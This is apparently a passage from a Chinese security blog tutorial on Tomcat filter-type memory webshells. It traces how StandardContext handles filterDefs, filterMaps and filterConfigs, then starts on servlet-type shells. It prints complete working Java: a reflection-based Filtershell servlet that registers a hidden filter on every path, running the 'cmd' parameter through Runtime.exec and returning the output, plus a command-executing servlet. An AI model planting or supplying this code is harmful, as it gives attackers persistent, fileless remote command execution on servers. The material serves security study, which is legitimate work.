<p>这个方法在判断filtername是否为空，以及context的state是否为程序刚启动的state之后，就调用StandardContext的addfilterDef方法，根据filtername来创建一个新的filter，当然这里的创建方法实际上是在判断context中是否有filtername对应的Filter存在。<br>之后判断这个filterDef是否为空，如果为空，说明这个filter是新的filter，逻辑开始实例化一个新的FilterDef，并将filtername置放进去，之后将新创建的 FilterDef 储存在了 StandardContext 中的一个 Hashmap filterDefs 中<br>由于此时我们的传进来的filter肯定是null，所以之后调用完 filterDef.setFilterClass之后直接就new了一个ApplicationFilterRegistration返回，并没有将我们指定加载的filter对象存入FilterChain，单纯只调用这个addfilter肯定是不能完成自定filter的注册的，而且在刚开始的时候添加了一个状态标记，如果此时程序处于运行状态就不给我们添加filter了.</p>
<p>这个时候返回去想能不能直接操控FilterChain?</p>
<h4 id="Filterchain探索"><a href="#Filterchain探索" class="headerlink" title="Filterchain探索"></a>Filterchain探索</h4><p>FilterChain在tomcat中的实现是<br><code>org.apache.catalina.core.ApplicationFilterChain</code> 这个类确实提供了一个addFilter方法添加filter，该方法接受一个ApplicationFilterConfig对象，然后将其放在this.filters中，看上去很行，但由于每次请求需要执行的FilterChain都是动态获取的，所以这条路也不好走。</p>
<p>我们重新捋一遍Tomcat是如何处理一次请求对应的FilterChain的，在ApplicationFilterFactory的createFilterChain方法中，大致流程如下：</p>
<ol>
<li>在context中获取到filterMaps，并且遍历匹配URL地址和请求是否匹配</li>
<li>如果匹配，则在context中根据filterMaps中的filterName查找对应的filterConfig</li>
<li>找到filterConfig之后就将其加入到filterChain中</li>
<li>后续循环filterChain中的全部filterConfig，通过getFilter方法获取filter，并执行各filter中的dofilter方法</li>
</ol>
<p>通过上述流程我们能够知道每次请求的filterChain都是动态匹配和生成的，如果想要添加一个filter，就必须往StandardContext中的filterMaps（至少得让程序知道你这存在这么一个filter）添加键值对，且filterConfigs 中添加 ApplicationFilterConfig（保证能获取到filter的配置信息），这样程序在创建时就能够找到添加的filter了</p>
<p>上一小节的addfilter中完成了对filter初始化，并存在了StandardContext的filterDefs中（走到逻辑的context.addfilterDef时添加的）<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/memshell-tomcat-img/6.png"></p>
<p>那我们这个filterDefs是怎么配置到其他参数（filterMaps与filterConfigs）中的呢？</p>
<p>在StandardContext的filterStart方法生成了filterConfigs<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/memshell-tomcat-img/7.png"></p>
<p>而在ApplicationFilterRegistration的addMappingForUrlPatterns方法生成了filterMaps<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/memshell-tomcat-img/8.png"></p>
<p>发现这两者信息都是从filterDefs中获取的</p>
<p>整理上述逻辑之后，我们理一下在应用程序中动态添加一个filter的条件和思路：</p>
<ul>
<li>首先肯定要创建好filterDefs，为此必须调用 ApplicationContext 的 addFilter 方法，而我们在添加新filterDef之前要经过一个状态检查，正在运行的程序是不能添加新filter的，所以要用反射给他改一下表示运行状态的参数，改完之后肯定还要改回来</li>
<li>调用StandardContext 的 filterStart 方法生成 filterConfigs</li>
<li>调用 ApplicationFilterRegistration 的 addMappingForUrlPatterns 生成 filterMaps</li>
<li>为了保证不出现意外状况，我们将恶意filter放在filterMaps的第一位，可以自己修改HashMap中的顺序，也可以自己调用StandardContext中的addFilterMapBefore方法直接放到filterMaps的第一位</li>
</ul>
<p>基于以上思路，开始实现流程</p>
<h3 id="实现前的流程分析"><a href="#实现前的流程分析" class="headerlink" title="实现前的流程分析"></a>实现前的流程分析</h3><p>首先先构建一个servlet项目<br>项目结构如下<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/memshell-tomcat-img/9.png"><br>这里记得filter建在java目录下<br>然后就是各文件内容 （servlet就不看了)<br>filter</p>
<pre><code class="java">import javax.servlet.*;  
import java.io.IOException;  
  
  
  
public class filter implements Filter &#123;  
@Override  
public void init(FilterConfig filterConfig) throws ServletException &#123;  
System.out.println(&quot;filter初始化完成&quot;);  
&#125;  
  
@Override  
public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;  
System.out.println(&quot;执行了dofilter方法&quot;);  
filterChain.doFilter(servletRequest,servletResponse);  
&#125;  
  
@Override  
public void destroy() &#123;  
  
&#125;  
&#125;
</code></pre>
<p>web.xml</p>
<pre><code class="xml">
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;  
&lt;web-app xmlns=&quot;https://jakarta.ee/xml/ns/jakartaee&quot;  
xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;  
xsi:schemaLocation=&quot;https://jakarta.ee/xml/ns/jakartaee https://jakarta.ee/xml/ns/jakartaee/web-app_5_0.xsd&quot;  
version=&quot;5.0&quot;&gt;  
  
&lt;filter&gt; &lt;filter-name&gt;filter&lt;/filter-name&gt;  
&lt;filter-class&gt;filter&lt;/filter-class&gt;  
&lt;/filter&gt;  
&lt;filter-mapping&gt; &lt;filter-name&gt;filter&lt;/filter-name&gt;  
&lt;url-pattern&gt;/filter&lt;/url-pattern&gt;  
&lt;/filter-mapping&gt;  
&lt;/web-app&gt;
</code></pre>
<p>之后运行tomcat<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/memshell-tomcat-img/10.png"></p>
<p>有的师傅是在分析dofilter()之前，有的是在分析dofilter()之后的流程</p>
<h4 id="dofilter之后"><a href="#dofilter之后" class="headerlink" title="dofilter之后"></a>dofilter之后</h4><p>这里我们都分析一遍（Drunkbaby师傅的流程）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/memshell-tomcat-img/11.png"></p>
<p>然后单步跟进，直接来到了ApplicationFilterChain类dofilter方法的最后部分–internalDoFilter()方法，在此之前的部分是在进行全局安全服务是否开启的判断<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/memshell-tomcat-img/12.png"></p>
<p>然后继续跟进<br>这里看到了熟悉的filterConfig，我们之前分析过，filterConfig最终是从StandardContext的filterStart方法生成的，这里就按住不表了，知道就好</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/memshell-tomcat-img/13.png"><br>这里的filters有两个，一个是系统自带的filter(0)，一个是我们自己创建的(1)<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/memshell-tomcat-img/14.png"><br>之后的流程filter循环遍历各个filter的dofilter方法了<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/memshell-tomcat-img/15.png"></p>
<p>到最后一个filter的时候就会调用servlet.service方法了，这里跟我们之前学的filter的生命周期代码调试的实现（源码没下下来，导致调试出现了一些错误）是一致的<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/memshell-tomcat-img/16.png"></p>
<p>dofilter之后的内容总结一下，根据filterConfig来加载filter，然后filterchain循环遍历filter的dofilter方法调用，在最后一个filter的dofilter方法被调用之后，才调用servlet的service方法</p>
<h4 id="访问dofilter之前"><a href="#访问dofilter之前" class="headerlink" title="访问dofilter之前"></a>访问dofilter之前</h4><p>分析dofilter之前的内容是为了弄懂我们该从哪下手将我们的filter写入进去，也就是找到filter是如何被创建的</p>
<p>我们刚才的调试界面<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/memshell-tomcat-img/17.png"></p>
<p>前面这一串都是在创建filter，虽然大部分都是是invoke在调用，但我们之前也分析过了filter的几个注册方式，addfilter以及createfilter等。<br>invoke之前的流程就不说了，对我们分析filter的流程没影响，tomcat的service容器中connector处理的过程<br>我们直接到StandardEngineValue的invoke方法<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/memshell-tomcat-img/18.png"></p>
<p>再跟进发现来到AbstractAccesLogValue类的invoke方法<br>发现接下来就是循环调用了<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/memshell-tomcat-img/19.png"></p>
<p>我们来到最后一个invoke，也就是StandardWrapperValue类的invoke方法</p>
<p>在这里执行了一段createFilterChain的方法，继续跟进<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/memshell-tomcat-img/20.png"></p>
<p>我们直接跳到最后两端for这里，前面filterChain对象创建好之后开始调用addfilter方法，到addfilter就是我们之前分析filter注册的地方了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/memshell-tomcat-img/21.png"></p>
<h4 id="接上流程的addfilter"><a href="#接上流程的addfilter" class="headerlink" title="接上流程的addfilter"></a>接上流程的addfilter</h4><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/memshell-tomcat-img/22.png"><br>根据前面的分析 addfilter在执行最开始会进行一个判断，也就是我们当前程序是否在运行，如果在运行就不给我们追加filter了<br>addfilter这个方法的主要作用是为了创建一个我们恶意filter的filterDef，因为最终filterMaps和filterConfig的内容都是从filterDef来的，所以我们考虑在addfilter这里用反射改一下运行状态参数，先创建好filterDef之后再改回去就行</p>
<p>然后就是</p>
<blockquote>
<p>1.StandardContext 的 filterStart 方法生成 filterConfigs<br>2.调用 ApplicationFilterRegistration 的 addMappingForUrlPatterns 生成 filterMaps<br>3.为了保证不出现意外状况，我们将恶意filter放在filterMaps的第一位，可以自己修改  4.HashMap中的顺序，也可以自己调用StandardContext中的addFilterMapBefore方法直接放到filterMaps的第一位</p>
</blockquote>
<h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><p>抓住一个点吧，不论是filtermapping还是filterConfigs都是来自于StndardContext<br>它里面的三个变量<br>filterConMaps：包含所有过滤器和URL映射的关系<br>filterDefs:包含所有过滤器以及内部变量<br>filterConfigs：包含所有与filter对应的filterDef信息以及filter实例<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/memshell-tomcat-img/23.png"></p>
<p>我们最终加载filter是根据filterConfigs里面的信息进行添加的，所以这里需要着重说一下filterConfigs</p>
<p>filterConfigs的成员变量是一个HashMap对象，这里的键和值分别是什么呢？<br>键是filter名称，值是对应的ApplicationFilterConfig。<br>而ApplicationFilterConfig对象里面则存储了filter实例；该实例在web.xml中注册信息（filterDef）；以及ServletContext</p>
<p>所以要构造出内存马，就必须满足filterConfigs的成员变量<br>现在开始正式写EXP，整体思路是：先获取standContext，然后获取我们的filter，再设置filterDef以及filterMaps<br>首先先把恶意filter写一下</p>
<pre><code class="java">import javax.servlet.*;  
import javax.servlet.annotation.WebFilter;  
import javax.servlet.annotation.WebServlet;  
import javax.servlet.http.HttpServletRequest;  
import javax.servlet.http.HttpServletResponse;  
  
import java.io.IOException;  
import java.io.InputStream;  
import java.util.Scanner;  
  
  
public class EvilFilter implements Filter &#123;  
public void destroy() &#123;  
&#125;  
  
public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws ServletException, IOException &#123;  
HttpServletRequest req = (HttpServletRequest) request;  
HttpServletResponse resp = (HttpServletResponse) response;  
if (req.getParameter(&quot;cmd&quot;) != null) &#123;  
boolean isLinux = true;  
String osTyp = System.getProperty(&quot;os.name&quot;);  
if (osTyp != null &amp;&amp; osTyp.toLowerCase().contains(&quot;win&quot;)) &#123;  
isLinux = false;  
&#125;  
String[] cmds = isLinux ? new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, req.getParameter(&quot;cmd&quot;)&#125; : new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, req.getParameter(&quot;cmd&quot;)&#125;;  
InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();  
Scanner s = new Scanner(in).useDelimiter(&quot;\\A&quot;);  
String output = s.hasNext() ? s.next() : &quot;&quot;;  
resp.getWriter().write(output);  
resp.getWriter().flush();  
&#125;  
chain.doFilter(request, response);  
&#125;  
  
public void init(FilterConfig config) throws ServletException &#123;  
  
&#125;  
  
&#125;
</code></pre>
<p>然后写一个servlet路由，待会访问这个路由就能够将我们的恶意filter注入了</p>
<p>在看整体的EXP之前呢，我们整体拆分成几个部分来分析，要获取到filterConfigs，就首先得想办法获取到standardcontext类。反射调用即可</p>
<pre><code class="java">ServletContext servletContext = request.getSession().getServletContext();  
Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);  
appctx.setAccessible(true);  
ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);  
  
Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);  
stdctx.setAccessible(true);  
StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
</code></pre>
<p>这部分得循环调用才能到standardcontext</p>
<p>之后的话就是正常的获取了，standardcontext中的filterconfigs</p>
<pre><code class="java">String FilterName = &quot;cmd_Filter&quot;;  
Field configs = standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);  
configs.setAccessible(true);  
filterConfigs = (Map) Configs.get(standardContext);
</code></pre>
<p>然后就是将恶意类复制过来就行，或者将其字节码文件base64一下传递过来也行，代码演示就不贴了，后续会有完整的EXP</p>
<p>现在我们只是获取到了filterConfigs，而要想真正创建一个filter放到filterchain中必须满足两个条件：<br>一是我们要有相关的filterconfigs，能够从filterconfig中获取相关配置信息，创建一个filter<br>二是我们在filterMaps必须要有&lt;路由,filter&gt;这个键值对，访问的到才能让程序知道有这个filter<br>所以接下来的工作就是创建这两个东西<br>filterMaps的很好解决，一个class和String URL就能解决<br>主要是filterConfigs，他是一个map键值对变量，键是filter名，值是ApplicationFilterConfig，而applicationFilterConfig的创建又需要filterDef,所以在创建filterConfigs时的思路就是先把filterDefs创建好，之后再把applicationFilterConfig创建好，然后再构造filterConfigs即可</p>
<p>filterDefs创建如下</p>
<pre><code class="java">//反射获取filterDef，设置filter名等参数
Class&lt;?&gt; FilterDef = Class.forName(&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;);  
Constructor declaredConstructors = FilterDef.getDeclaredConstructor();  
FilterDef o = (FilterDef) declaredConstructors.newInstance();


//将filter的类和名都要放进去，然后再调用addfilterDef将我们刚才构建好的filterDef添加  
o.setFilter(filter);  
o.setFilterName(FilterName);  
o.setFilterClass(filter.getClass().getName());  
//肯定也要存入standardcontext的filterDefs
standardContext.addFilterDef(o);
</code></pre>
<p>然后是FilterMap</p>
<pre><code class="java">//反射获取FilterMap,设置URL(到时候要访问的拦截路径),调用addfilterBefore将我们的filter设置成第一个拦截  
Class&lt;?&gt; FilterMap = Class.forName(&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;);  
Constructor&lt;?&gt; declaredConstructor = FilterMap.getDeclaredConstructor();  
org.apache.tomcat.util.descriptor.web.FilterMap o1 = (FilterMap) declaredConstructor.newInstance();  
  
o1.addURLPattern(&quot;/*&quot;);  
o1.setFilterName(FilterName);  
o1.setDispatcher(DispatcherType.REQUEST.name());  
standardContext.addFilterMapBefore(o1);
</code></pre>
<p>最后是filterConfigs</p>
<pre><code class="java">
//反射获取ApplicationFilterConfig,在构造的时候传入我们的filterDef
Class&lt;?&gt; applicationfilterconfig = Class.forName(&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;);  
Constructor&lt;?&gt; declaredConstructor1 = applicationfilterconfig.getDeclaredConstructor();  
declaredConstructor1.setAccessible(true);  
ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) declaredConstructor1.newInstance(standardContext, o);  
filterConfigs.put(FilterName, filterConfig);  
response.getWriter().write(&quot;Sucess&quot;);
</code></pre>
<p>这里o是紧接着我们上面提前构造的好的filterDef</p>
<p>整体POC如下</p>
<pre><code class="java">import jakarta.servlet.annotation.WebServlet;  
import org.apache.catalina.Context;  
import org.apache.catalina.core.ApplicationContext;  
import org.apache.catalina.core.ApplicationFilterConfig;  
import org.apache.catalina.core.StandardContext;  
import org.apache.tomcat.util.descriptor.web.FilterDef;  
import org.apache.tomcat.util.descriptor.web.FilterMap;  
  
import javax.servlet.*;  
import javax.servlet.http.HttpServlet;  
import javax.servlet.http.HttpServletRequest;  
import javax.servlet.http.HttpServletResponse;  
import java.io.IOException;  
import java.io.InputStream;  
import java.lang.reflect.Constructor;  
import java.lang.reflect.Field;  
import java.util.Map;  
import java.util.Scanner;  
  
@WebServlet(name = &quot;Filtershell&quot;, value = &quot;/filter-shell&quot;)  
public class Filtershell extends HttpServlet &#123;  
protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;  
//Field Configs = null;  
Map filterConfigs;  
try &#123;  
//反射获取standardContext  
ServletContext servletContext = request.getSession().getServletContext();  
Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);  
appctx.setAccessible(true);  
ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);  
  
Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);  
stdctx.setAccessible(true);  
StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);  
  
//获取到standardcontext中的filterConfigs  
String FilterName = &quot;cmd_Filter&quot;;  
Field configs = standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);  
configs.setAccessible(true);  
filterConfigs = (Map) configs.get(standardContext);  
  
//因为可能访问这个路由不止一次,循环写马没必要了,if判断一下就行  
if (filterConfigs.get(FilterName) == null) &#123;  
Filter filter = new Filter() &#123;  
@Override  
public void init(FilterConfig filterConfig) throws ServletException &#123;  
&#125;  
  
@Override  
public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;  
HttpServletRequest req = (HttpServletRequest) servletRequest;  
if (req.getParameter(&quot;cmd&quot;) != null)&#123;  
  
InputStream in = Runtime.getRuntime().exec(req.getParameter(&quot;cmd&quot;)).getInputStream();  
//  
Scanner s = new Scanner(in).useDelimiter(&quot;\\A&quot;);  
String output = s.hasNext() ? s.next() : &quot;&quot;;  
servletResponse.getWriter().write(output);  
  
return; &#125;  
filterChain.doFilter(servletRequest,servletResponse);  
&#125;  
  
@Override  
public void destroy() &#123;  
&#125;  
&#125;;  
  
//反射获取filterDef，设置filter名等参数  
Class&lt;?&gt; FilterDef = Class.forName(&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;);  
Constructor declaredConstructors = FilterDef.getDeclaredConstructor();  
FilterDef o = (FilterDef) declaredConstructors.newInstance();  
  
//将filter的类和名都要放进去，然后再调用addfilterDef将我们刚才构建好的filterDef添加  
o.setFilter(filter);  
o.setFilterName(FilterName);  
o.setFilterClass(filter.getClass().getName());  
standardContext.addFilterDef(o);  
  
//反射获取FilterMap,设置URL(到时候要访问的拦截路径),调用addfilterBefore将我们的filter设置成第一个拦截  
Class&lt;?&gt; FilterMap = Class.forName(&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;);  
Constructor&lt;?&gt; declaredConstructor = FilterMap.getDeclaredConstructor();  
org.apache.tomcat.util.descriptor.web.FilterMap o1 = (FilterMap) declaredConstructor.newInstance();  
  
o1.addURLPattern(&quot;/*&quot;);  
o1.setFilterName(FilterName);  
o1.setDispatcher(DispatcherType.REQUEST.name());  
standardContext.addFilterMapBefore(o1);  
  
//反射获取ApplicationFilterConfig,在构造的时候传入我们的filterDef  
Class&lt;?&gt; applicationfilterconfig = Class.forName(&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;);  
Constructor&lt;?&gt; declaredConstructor1 = applicationfilterconfig.getDeclaredConstructor(Context.class,FilterDef.class);  
declaredConstructor1.setAccessible(true);  
ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) declaredConstructor1.newInstance(standardContext, o);  
filterConfigs.put(FilterName, filterConfig);  
response.getWriter().write(&quot;filteradd&quot;);  
  
&#125;  
&#125; catch (Exception e) &#123;  
throw new RuntimeException(e);  
&#125;  
  
  
&#125;  
  
protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;  
this.doPost(request, response);  
&#125;  
  
&#125;
</code></pre>
<p>我们实验一下<br>首先访问生成恶意filter的路由&#x2F;filtershell，提示filter已经add进去了<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/memshell-tomcat-img/24.png"><br>然后filterMaps里面我们设置的filter路由是&#x2F;*，也就是所有路径<br>这个时候我们任意访问之前写过的路由，然后加上?cmd&#x3D;calc的参数<br>这里用idea专业版生成Tomcat项目会自带一个hello-servlet路由，我们就拿它来演示<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/memshell-tomcat-img/25.png"><br>写入成功<br>稍微总结一下filter型内存马的内容：<br><strong>总的过程是如何植入新的filter</strong><br>想要植入新的filter，我们分析出来的方法是在filterchain创建的过程中植入 也就是createFilterchain这个方法<br>他会根据<strong>filterConfig</strong>来生成新filter，然后根据<strong>filterMap</strong>来建立路由与filter的关系，也就是访问哪些路由能够经过这个filter<br>所以我们接下来就是创建号filterConfig和filterMap<br>filterMap简单，把我们的filter实例和路由传进去即可<br>filterConfig分为applicationFilterConfig与filterDef组成键值对 所以任务就是创建好applicationFilterConfig与filterDef即可</p>
<h2 id="servlet型内存马"><a href="#servlet型内存马" class="headerlink" title="servlet型内存马"></a>servlet型内存马</h2><p>注意这里的servlet和httpservlet有所区别<br>依然还是要了解如何添加新的servlet流程，我们可以看看servletcontext的实现类–ApplicationContext，他里面有关于新servlet的生成方法<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/memshell-tomcat-img/26.png"></p>
<p>这里还是看看su18佬的源码图片，我自己的不是很清晰<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/memshell-tomcat-img/27.png"><br>其实跟我们之前看的addfilter的内容是差不多逻辑的<br>先判断我们的要创建的servletName是否为空，然后判断应用程序状态<br>然后也是在context中查找是否已经有了该servlet，如果有就直接调，如果没有就创建一个wrapper放入child，这里跟addfilter的创建一个filterDef的内容很像</p>
<p>那其实就很自然的想到它是如何加载到我们的servlet以及如何定位到servlet的</p>
<p>ApplicationServletRegistration的addMapping方法依然调用了standardContext中的方法—addServletMapping，这个mapping的键值对是URL路径和Wrapper对象<br>同时也在servletMappings中添加URL路径和name的映射</p>
<h3 id="Servlet创建流程"><a href="#Servlet创建流程" class="headerlink" title="Servlet创建流程"></a>Servlet创建流程</h3><p>现在本地来测试一下Servlet的过程，首先先写一个测试servlet </p>
<pre><code class="java">import javax.servlet.*;  
import javax.servlet.annotation.WebServlet;  
import java.io.IOException;  
  
// 基础恶意类  
public class ServletTest implements Servlet &#123;  
@Override  
public void init(ServletConfig config) throws ServletException &#123;  
  
&#125;  
  
@Override  
public ServletConfig getServletConfig() &#123;  
return null;  
&#125;  
  
@Override  
public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException &#123;  
String cmd = req.getParameter(&quot;cmd&quot;);  
if (cmd != null) &#123;  
try &#123;  
Runtime.getRuntime().exec(cmd);  
&#125; catch (IOException e) &#123;  
e.printStackTrace();  
&#125; catch (NullPointerException n) &#123;  
n.printStackTrace();  
&#125;  
&#125;  
&#125;  
  
@Override  
public String getServletInfo() &#123;  
return null;  
&#125;  
  
@Override  
public void destroy() &#123;  
  
&#125;  
&#125;
</code></pre>
<p>web.xml也配置一下</p>
<pre><code class="xml">&lt;servlet&gt;  
&lt;servlet-name&gt;ServletTest&lt;/servlet-name&gt;  
&lt;servlet-class&gt;com.example.servletdemo.ServletTest&lt;/servlet-class&gt;  
&lt;/servlet&gt;  
&lt;servlet-mapping&gt;  
&lt;servlet-name&gt;ServletTest&lt;/servlet-name&gt;  
&lt;url-pattern&gt;/ServletTest&lt;/url-pattern&gt;  
&lt;/servlet-mapping&gt;
</code></pre>
<p>然后我们把断点打在init方法，开启tomcat服务之后路由访问ServletTest</p>
<p>发现前面已经经过了很多流程<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/memshell-tomcat-img/28.png"></p>
<p>之前的tomcat基础应该还有印象，发现了几个熟悉的字样 EndPoint Processor Adapter，跟我们的tomcat与外界交互的流程是一样的<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/memshell-tomcat-img/29.png"><br>上面这段流程其实跟我们这次分析servlet怎么最终通过web.xml来获取配置信息加载联系不是很大，这里就不跟进之前的流程了，总结一下就是获取到外部的请求信息包之后解析，然后将其转化为request对象，在通过adpter转化为servletrequest对象传给container容器进行处理（里面包含我们的filter listener servlet)</p>
<p>我们移动到读取web.xml配置信息加载servlet的流程开始 <strong>ContextConfig.configureContext()</strong><br>直接来到configureContext方法关于servlet创建的地方<br>这里是首先调用createWrapper，因为在tomcat中servlet是必须用wrapper包起来的，所以想要创建一个servlet，就必须先创建一个wrapper</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/memshell-tomcat-img/30.png"><br>还注意到调用的context的createWrapper，也就是standardContext，不论是filter还是listener和servlet，我们想要创建一个新的，就必须和stanardContext打交道，他也是整个tomcat三大件创建的相关核心类<br>我们在这里下个断点调试一下</p>
<p>运行tomcat，他会断在这里，现在加载的是他自带的一些servlet，就拿这个默认的举例，下一步就是将这个servlet的name放到wrapper里面<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/memshell-tomcat-img/31.png"></p>
<p>然后开始获取webxml中的内容，将指定的servlet类的全类名放进去<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/memshell-tomcat-img/32.png"></p>
